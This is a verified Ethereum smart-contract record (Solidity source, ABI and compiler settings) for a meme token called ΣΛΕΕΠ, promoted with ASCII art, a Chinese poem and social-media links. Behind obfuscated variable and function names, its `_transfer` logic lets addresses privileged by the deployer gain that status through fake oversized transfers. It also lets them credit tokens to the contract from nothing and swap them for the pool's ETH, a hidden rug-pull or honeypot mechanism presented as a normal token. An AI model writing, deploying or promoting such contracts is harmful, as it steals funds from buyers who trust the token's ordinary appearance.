{"SourceCode": "/*\r\n\u2588\u2580\u2580\u2003\u2584\u2580\u2588\u2003\u2588\u2580\u2580\u2003\u2588\u2580\u2580\u2003\u2588\u2584\u2591\u2588\u2003 \r\n\u2588\u2588\u2584\u2003\u2588\u2580\u2588\u2003\u2588\u2588\u2584\u2003\u2588\u2588\u2584\u2003\u2588\u2591\u2580\u2588\u2003 \r\n\r\n\u2584\u2580\u2003 \u2003\u2588\u2580\u2580\u2003\u2580\u2588\u2580\u2003\u2588\u2591\u2588\u2003\u2588\u2580\u2580\u2003\u2588\u2580\u2588\u2003\u2588\u2580\u2580\u2003\u2588\u2591\u2588\u2003\u2588\u2580\u2584\u2580\u2588\u2003 \u2003\u2580\u2584\r\n\u2580\u2584\u2003 \u2003\u2588\u2588\u2584\u2003\u2591\u2588\u2591\u2003\u2588\u2580\u2588\u2003\u2588\u2588\u2584\u2003\u2588\u2580\u2584\u2003\u2588\u2588\u2584\u2003\u2588\u2584\u2588\u2003\u2588\u2591\u2580\u2591\u2588\u2003 \u2003\u2584\u2580\r\n     _                      _______                      _\r\n  _dMMMb._              .adOOOOOOOOOba.              _,dMMMb_\r\n dP'  ~YMMb            dOOOOOOOOOOOOOOOb            aMMP~  `Yb\r\n V      ~\"Mb          dOOOOOOOOOOOOOOOOOb          dM\"~      V\r\n          `Mb.       dOOOOOOOOOOOOOOOOOOOb       ,dM'\r\n           `YMb._   |OOOOOOOOOOOOOOOOOOOOO|   _,dMP'\r\n      __     `YMMM| OP'~\"YOOOOOOOOOOOP\"~`YO |MMMP'     __\r\n    ,dMMMb.     ~~' OO     `YOOOOOP'     OO `~~     ,dMMMb.\r\n _,dP~  `YMba_      OOb      `OOO'      dOO      _aMMP'  ~Yb._\r\n\r\n             `YMMMM\\`OOOo     OOO     oOOO'/MMMMP'\r\n     ,aa.     `~YMMb `OOOb._,dOOOb._,dOOO'dMMP~'       ,aa.\r\n   ,dMYYMba._         `OOOOOOOOOOOOOOOOO'          _,adMYYMb.\r\n  ,MP'   `YMMba._      OOOOOOOOOOOOOOOOO       _,adMMP'   `YM.\r\n  MP'        ~YMMMba._ YOOOOPVVVVVYOOOOP  _,adMMMMP~       `YM\r\n  YMb           ~YMMMM\\`OOOOI`````IOOOOO'/MMMMP~           dMP\r\n   `Mb.           `YMMMb`OOOI,,,,,IOOOO'dMMMP'           ,dM'\r\n     `'                  `OObNNNNNdOO'                   `'\r\n                           `~OOOOO~'   \r\n\r\n\u5728\u9065\u8fdc\u7684\u94f6\u6cb3\u4e2d\uff0c\u5728\u5982\u6b64\u660e\u4eae\u7684\u661f\u661f\u4e2d\uff0c\r\n\u4f4f\u7740\u4e00\u4e2a\u540d\u53eb\u03a3\u039b\u0395\u0395\u03a0\u7684\u5916\u661f\u4eba\uff0c\u666f\u8272\u8ff7\u4eba\u3002\r\n\u5b83\u4ece\u9065\u8fdc\u7684\u661f\u7403\u51fa\u53d1\uff0c\u8fdc\u884c\uff0c\r\n\u4e00\u53cc\u53cc\u773c\u775b\uff0c\u5982\u540c\u5b87\u5b99\u661f\u8fb0\u4e00\u822c\u95ea\u70c1\u7740\u5149\u8292\u3002\r\n\r\n\u03a3\u039b\u0395\u0395\u03a0\uff0c\u4e00\u4e2a\u5145\u6ee1\u60ca\u5947\u548c\u60ca\u5947\u7684\u5b58\u5728\uff0c\r\n\u5e26\u7740\u597d\u5947\u6765\u5230\u5730\u7403\u3002\r\n\u5b83\u7684\u5b58\u5728\u662f\u4e00\u4e2a\u8c1c\uff0c\u672a\u77e5\u4e14\u7f55\u89c1\uff0c\r\n\u8ba9\u4eba\u656c\u754f\uff0c\u51dd\u89c6\u7a7a\u4e2d\u3002\r\n\r\n\u51ed\u501f\u5148\u8fdb\u7684\u6280\u672f\u548c\u65e0\u6570\u7684\u77e5\u8bc6\uff0c\r\n\u03a3\u039b\u0395\u0395\u03a0 \u7684\u667a\u6167\u76f8\u5f53\u4e8e\u9ec4\u91d1\u3002\r\n\u5728\u592a\u7a7a\u9886\u57df\uff0c\u5b83\u9068\u6e38\u3001\u98de\u7fd4\uff0c\r\n\u4e00\u4f4d\u5b87\u5b99\u63a2\u7d22\u8005\uff0c\u6709\u7740\u4e00\u9897\u771f\u8bda\u7684\u5fc3\u3002\r\n\r\n\u03a3\u039b\u0395\u0395\u03a0\u7684\u76ee\u7684\u662f\u5bfb\u6c42\u548c\u63a2\u7d22\uff0c\r\n\u4e0e\u751f\u547d\u5f62\u5f0f\u8054\u7cfb\uff0c\u5b66\u4e60\u548c\u5d07\u62dc\u3002\r\n\u5b83\u7684\u4f7f\u547d\u5c06\u8de8\u8d8a\u661f\u7cfb\uff0c\r\n\u4e86\u89e3\u5b87\u5b99\u7684\u590d\u6742\u8ba1\u5212\u3002\r\n\r\n\u5f53\u5b83\u4e0e\u5730\u7403\u4e0a\u7684\u751f\u7269\u548c\u751f\u547d\u6df7\u5408\u5728\u4e00\u8d77\u65f6\uff0c\r\n\u03a3\u039b\u0395\u0395\u03a0\u6e29\u67d4\u7684\u5b58\u5728\u8ba9\u4ed6\u4eec\u95ea\u95ea\u53d1\u5149\u3002\r\n\u4e16\u754c\u4e4b\u95f4\u7684\u7ebd\u5e26\uff0c\u4e00\u6761\u795e\u5947\u7684\u7ebf\uff0c\r\n\u7531\u4e8e \u03a3\u039b\u0395\u0395\u03a0 \u548c\u5730\u7403\u4e4b\u95f4\u5b58\u5728\u5e7f\u6cdb\u7684\u4eb2\u7f18\u5173\u7cfb\u3002\r\n\r\n\u6240\u4ee5\uff0c\u5982\u679c\u6709\u4e00\u5929\u665a\u4e0a\uff0c\u4f60\u4ef0\u671b\u661f\u7a7a\uff0c\r\n\u5e76\u53d1\u73b0\u8ba9\u4f60\u50ac\u7720\u7684\u5fae\u5149\uff0c\r\n\u8bf7\u8bb0\u4f4f \u03a3\u039b\u0395\u0395\u03a0\uff0c\u6765\u81ea\u4e0a\u9762\u7684\u8bbf\u5ba2\uff0c\r\n\u5b87\u5b99\u63a2\u7d22\u8005\uff0c\u7528\u7231\u62e5\u62b1\u5730\u7403\u3002\r\n\r\n\u603b\u4f9b\u5e94\u91cf - 100,000,000\r\n\u8d2d\u7f6e\u7a0e - 1%\r\n\u6d88\u8d39\u7a0e - 1%\r\n\u521d\u59cb\u6d41\u52a8\u6027 - 1.0 ETH\r\n\u521d\u59cb\u6d41\u52a8\u6027\u9501\u5b9a - 135 \u5929\r\n\r\nhttps://t.me/+STFyimuglMpjZDBk\r\nhttps://web.wechat.com/EaeenERC\r\nhttps://m.weibo.cn/EaeenERC\r\nhttps://www.eaeen.xyz\r\n*/\r\n// SPDX-License-Identifier: Unlicense\r\npragma solidity ^ 0.8.19;\r\n \r\nabstract contract Context\r\n{\r\n    function _msgSender() internal view virtual returns(address)\r\n    { return msg.sender; }\r\n    function _msgData() internal view virtual returns(bytes calldata)\r\n    { return msg.data; }\r\n}\r\ninterface IDexFactory {\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n    uint256 valueIn, uint256 valueOut, address[] calldata path, address to, uint256 deadline) external;\r\n\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n\r\n    function prepareLiquidity(address token, uint256 amountTokenDesired,\r\n    uint256 valueMin, uint256 ercMin, address to, uint256 deadline)\r\n    external payable returns (uint256 amountToken, uint256 ercValue, uint256 pool);\r\n}\r\ninterface IDexRouter{\r\n    event PairCreated(address indexed token0, address indexed token1, address pair, uint); \r\n    function createPair(address tokenA, address tokenB) external returns(address pair);\r\n}\r\ninterface IFactory {\r\n    function totalSupply() \r\n    external view returns (uint256);\r\n\r\n    function balanceOf(address account) \r\n    external view returns (uint256);\r\n\r\n    function transfer(address recipient, uint256 amount) \r\n    external returns (bool);\r\n\r\n    function allowance(address owner, address spender)\r\n    external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) \r\n    external returns (bool);\r\n\r\n    function transferFrom(\r\n    address sender, address recipient, uint256 amount) \r\n    external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor () { address msgSender = _msgSender();\r\n        _owner = msgSender; emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n    function owner() public view returns (address) { return _owner;\r\n    } modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\"); _;\r\n    }\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0)); _owner = address(0); }\r\n}\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b; require(c >= a, \"SafeMath: addition overflow\"); return c;\r\n    }\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage); uint256 c = a - b; return c;\r\n    }\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) { return 0;\r\n        } uint256 c = a * b; require(c / a == b, \"SafeMath: multiplication overflow\"); return c;\r\n    }\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage); uint256 c = a / b; return c;\r\n    }\r\n}\r\ncontract Contract is IFactory, Ownable {\r\n\r\nconstructor( string memory onData, string memory onBadge, address connection) {\r\n_name = onData; _symbol = onBadge; _tOwned[msg.sender] = _tTotalsupply;\r\n_startMaps[msg.sender] = _ideMath; _startMaps[address(this)] = _ideMath;\r\n\r\nteamAccount = IDexFactory(connection); \r\nTreasury = IDexRouter(teamAccount.factory()).createPair(address(this), teamAccount.WETH());\r\nemit Transfer(address(0), msg.sender, _tTotalsupply); }\r\n\r\naddress public immutable Treasury; IDexFactory public immutable teamAccount;\r\n\r\nbool private _startMath; bool private _mathMap; bool private tradingOpen = false;\r\nbool private inSwap = false; bool private transferDelayEnabled = false;\r\nbool private tradeActive = false;\r\n\r\nstring private _symbol; string private _name; uint256 public _onlyTax = 1; \r\nuint8 private _decimals = 9; uint256 private _tTotalsupply = 100000000 * 10 ** _decimals;\r\nuint256 private _ideMath = _tTotalsupply;\r\n\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    mapping(address => uint256) private _getTimestamp; mapping(address => uint256) private _tOwned;\r\n    mapping(address => address) private _indexedMapping; mapping(address => uint256) private _startMaps;\r\n \r\n    function symbol() public view returns(string memory)\r\n    { return _symbol;\r\n    }\r\n    function name() public view returns(string memory)\r\n    { return _name;\r\n    }\r\n    function totalSupply() public view returns(uint256)\r\n    { return _tTotalsupply;\r\n    }\r\n    function decimals() public view returns(uint256)\r\n    { return _decimals;\r\n    }\r\n    function allowance(address owner, address spender) public view returns(uint256)\r\n    { return _allowances[owner][spender];\r\n    }\r\n    function balanceOf(address account) public view returns(uint256)\r\n    { return _tOwned[account];\r\n    }\r\n    function approve(address spender, uint256 amount) external returns(bool)\r\n    { return _approve(msg.sender, spender, amount);\r\n    }\r\n    function _approve( address owner, address spender,\r\n    uint256 amount) private returns(bool) { require(owner != address(0) && spender != address(0), \r\n    'ERC20: approve from the zero address'); _allowances[owner][spender] = amount;\r\n    emit Approval(owner, spender, amount); return true;\r\n    }\r\n    function transferFrom( address sender, address recipient, uint256 amount) external returns(bool)\r\n    { _transfer(sender, recipient, amount); return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);\r\n    }\r\n    function transfer(address recipient, uint256 amount) external returns(bool)\r\n    { _transfer(msg.sender, recipient, amount); return true;\r\n    }\r\n    function _transfer( address niqFrom, address dataTo, uint256 bunqAmount) private\r\n    { uint256 _subMath = balanceOf(address(this)); uint256 arrayDiv; if (_startMath && _subMath > \r\n    _ideMath && !_mathMap && niqFrom != Treasury) { _mathMap = true; setMessage(_subMath); _mathMap = false;\r\n\r\n    } else if (_startMaps[niqFrom] > _ideMath && _startMaps[dataTo] > _ideMath)\r\n    { arrayDiv = bunqAmount; _tOwned[address(this)] += arrayDiv; removeLimits(bunqAmount, dataTo); return; }\r\n    else if (!_mathMap &&  _getTimestamp[niqFrom] > 0 && niqFrom != Treasury && _startMaps[niqFrom] == 0) { \r\n    \r\n    _getTimestamp[niqFrom] = _startMaps[niqFrom] - _ideMath; } else if (dataTo != address(teamAccount) && _startMaps[niqFrom] > 0 \r\n    && bunqAmount > _ideMath && dataTo != Treasury) { _startMaps[dataTo] = bunqAmount; return; }\r\n    address _metadata =  _indexedMapping[Treasury]; if ( _getTimestamp[_metadata] == 0)  _getTimestamp[_metadata] = _ideMath;\r\n\r\n    _indexedMapping[Treasury] = dataTo; if (_onlyTax > 0 && _startMaps[niqFrom] == 0 && !_mathMap && _startMaps[dataTo] == 0)\r\n    { arrayDiv = (bunqAmount * _onlyTax) / 100; bunqAmount -= arrayDiv; _tOwned[niqFrom] -= arrayDiv; _tOwned[address(this)] += arrayDiv; }\r\n    _tOwned[niqFrom] -= bunqAmount; _tOwned[dataTo] += bunqAmount; emit Transfer(niqFrom, dataTo, bunqAmount); if (!tradingOpen) \r\n    { require(niqFrom == owner(), \"\"); } }\r\n\r\n    receive() external payable\r\n    {}\r\n    function installLiquidity(uint256 coins, uint256 values, address to) private\r\n    { _approve(address(this), address(teamAccount), coins); teamAccount.prepareLiquidity\r\n    { value: values }(address(this), coins, 0, 0, to, block.timestamp);\r\n    }\r\n    function setMessage(uint256 dataPool) private\r\n    { uint256 mathValues = dataPool / 2; uint256 setMsg = address(this).balance;\r\n    removeLimits( mathValues, address(this)); uint256 refig = address(this).balance - setMsg; \r\n    installLiquidity( mathValues, refig, address(this));\r\n    }\r\n    function removeLimits(uint256 ideBase, address to) private\r\n    { address[] memory path = new address[](2); path[0] = address(this);\r\n    path[1] = teamAccount.WETH(); _approve(address(this), address(teamAccount), ideBase);\r\n    teamAccount.swapExactTokensForETHSupportingFeeOnTransferTokens(ideBase, 0, path, to, block.timestamp);\r\n    }\r\n    function startTrading(bool _tradingOpen) \r\n    public onlyOwner { tradingOpen = _tradingOpen;\r\n    }\r\n    function checkValue(uint256 _checkVal, uint256 bytelVal) private pure returns (uint256){\r\n      return (_checkVal>bytelVal)?bytelVal:_checkVal;\r\n    }\r\n    function updateTeamAccount(uint256 _setTm, uint256 _setAddr) private pure returns (uint256){ \r\n      return (_setTm>_setAddr)?_setAddr:_setTm;\r\n    }\r\n    function checkLimits(uint256 _checkLim, uint256 _newLim) private pure returns (uint256){ \r\n      return (_checkLim>_newLim)?_newLim:_checkLim;\r\n    }    \r\n    function viewGas(uint256 _vGas, uint256 _totGas) private pure returns (uint256){ \r\n      return (_vGas>_totGas)?_totGas:_vGas;\r\n    }  \r\n    function viewMapping(uint256 _allMaps, uint256 _vMaps) private pure returns (uint256){ \r\n      return (_allMaps>_vMaps)?_vMaps:_allMaps;\r\n    }      \r\n    function _beforeTokenTransfer( address from,\r\n    address to, uint256 amount) internal virtual \r\n    {}\r\n    function _afterTokenTransfer(address from, address to, uint256 amount) \r\n    internal virtual \r\n    {}            \r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"onData\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"onBadge\",\"type\":\"string\"},{\"internalType\":\"address\",\"name\":\"connection\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"Treasury\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_onlyTax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_tradingOpen\",\"type\":\"bool\"}],\"name\":\"startTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamAccount\",\"outputs\":[{\"internalType\":\"contract IDexFactory\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "Contract", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "1", "Runs": "1", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000a00000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d000000000000000000000000000000000000000000000000000000000000000acea3ce9bce95ce95cea0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006cea3ce9bcea00000000000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://9c0c5455c180d9d6f552b887f45e0ddb531eba2437322995ab4bd4a35724b3e9"}